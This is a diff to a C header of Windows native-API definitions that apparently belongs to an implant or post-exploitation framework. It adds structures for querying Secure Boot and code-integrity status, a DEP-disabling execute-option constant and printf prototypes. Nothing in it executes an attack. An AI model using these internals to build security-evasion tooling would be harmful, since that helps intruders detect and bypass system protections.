@@ -13,6 +13,11 @@ typedef struct _TASK_RESULT {
     BOOL       ShouldClean;
 } TASK_RESULT;
 
+typedef struct _MM_INFO {
+    PBYTE  Ptr;
+    SIZE_T Size;
+} MM_INFO;
+
 #define KhGetError       NtCurrentTeb()->LastErrorValue
 #define KhSetError( x )  NtCurrentTeb()->LastErrorValue = x
 #define KhRetError( x )  KhSetError( x ); return KhGetError
@@ -2409,6 +2414,15 @@ typedef struct _TPP_QUEUE
     struct _RTL_SRWLOCK Lock;
 } TPP_QUEUE, * PTPP_QUEUE;
 
+typedef struct _SYSTEM_SECUREBOOT_POLICY_INFORMATION
+{
+    GUID PolicyPublisher;
+    ULONG PolicyVersion;
+    ULONG PolicyOptions;
+} SYSTEM_SECUREBOOT_POLICY_INFORMATION, *PSYSTEM_SECUREBOOT_POLICY_INFORMATION;
+
+#define MEM_EXECUTE_OPTION_ENABLE 0x2       // ignore the NX bit: DEP off, enable executing most of ro/rw memory; trumps over the _DISABLE option
+
 typedef struct _FULL_TP_POOL
 {
     struct _TPP_REFCOUNT Refcount;
@@ -2664,6 +2678,31 @@ typedef enum _WORKERFACTORYINFOCLASS
 #define FILE_DISPOSITION_POSIX_SEMANTICS 0x00000002
 #define FileDispositionInfoEx 21
 
+typedef struct _SYSTEM_CODEINTEGRITY_INFORMATION {
+    ULONG Length;
+    ULONG CodeIntegrityOptions;
+} SYSTEM_CODEINTEGRITY_INFORMATION, *PSYSTEM_CODEINTEGRITY_INFORMATION;
+
+#define CODEINTEGRITY_OPTION_ENABLED                      0x0001
+#define CODEINTEGRITY_OPTION_TESTSIGN                     0x0002
+#define CODEINTEGRITY_OPTION_UMCI_ENABLED                 0x0004
+#define CODEINTEGRITY_OPTION_UMCI_AUDITMODE_ENABLED       0x0008
+#define CODEINTEGRITY_OPTION_UMCI_EXCLUSIONPATHS_ENABLED  0x0010
+#define CODEINTEGRITY_OPTION_TEST_BUILD                   0x0020
+#define CODEINTEGRITY_OPTION_PREPRODUCTION_BUILD          0x0040
+#define CODEINTEGRITY_OPTION_DEBUGMODE_ENABLED            0x0080
+#define CODEINTEGRITY_OPTION_FLIGHT_BUILD                 0x0100
+#define CODEINTEGRITY_OPTION_FLIGHTING_ENABLED            0x0200
+#define CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED            0x0400
+#define CODEINTEGRITY_OPTION_HVCI_KMCI_AUDITMODE_ENABLED  0x0800
+#define CODEINTEGRITY_OPTION_HVCI_KMCI_STRICTMODE_ENABLED 0x1000
+#define CODEINTEGRITY_OPTION_HVCI_IUM_ENABLED             0x2000
+
+typedef struct _SYSTEM_SECUREBOOT_INFORMATION {
+    BOOLEAN SecureBootEnabled;
+    BOOLEAN SecureBootCapable;
+} SYSTEM_SECUREBOOT_INFORMATION, *PSYSTEM_SECUREBOOT_INFORMATION;
+
 /* ========== [ Expands ] ========== */
 #define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001 // NtCreateUserProcess & NtCreateThreadEx
 
@@ -2750,5 +2789,10 @@ NTSYSCALLAPI NTSTATUS NtOpenThreadTokenEx( HANDLE ThreadHandle, ACCESS_MASK Desi
 NTSYSCALLAPI NTSTATUS NtOpenProcessTokenEx( HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, PHANDLE TokenHandle );
 NTSYSAPI BOOLEAN STDAPIVCALLTYPE RtlAddFunctionTable( _In_reads_(EntryCount) PRUNTIME_FUNCTION FunctionTable,  _In_ ULONG EntryCount, _In_ ULONG64 BaseAddress );
 NTSYSAPI PRUNTIME_FUNCTION RtlLookupFunctionEntry( DWORD64 ControlPc, PDWORD64 ImageBase, PUNWIND_HISTORY_TABLE HistoryTable );
+int k_vswprintf(wchar_t *buffer, size_t count, const wchar_t *format, va_list argptr);
+int k_vscwprintf( const wchar_t* format, va_list argptr );
+int k_swprintf(wchar_t* buffer, const wchar_t* format, ...);
+
+EXTERN_C VOID volatile ___chkstk_ms( VOID );
 
 #endif // WIN32_H             
